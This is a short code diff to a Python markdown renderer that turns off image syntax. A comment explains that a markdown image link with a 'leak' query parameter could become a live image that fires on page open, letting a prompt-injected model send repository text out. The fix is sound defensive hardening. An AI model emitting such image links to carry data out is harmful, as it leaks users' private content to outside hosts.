@@ -14,7 +14,10 @@ from markdown_it import MarkdownIt
 
 from .llm import extract_mermaid  # noqa: F401  (re-exported for custom renderers)
 
-_MD = MarkdownIt("commonmark", {"html": False, "linkify": True, "breaks": False}).enable(["table"])
+# coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
+# live <img> that fires on page open, an egress channel from repo text via
+# a prompt-injected model. html=False does not cover it.
+_MD = MarkdownIt("commonmark", {"html": False, "linkify": True, "breaks": False}).enable(["table"]).disable("image")
 
 @dataclass(frozen=True)
 class Section:
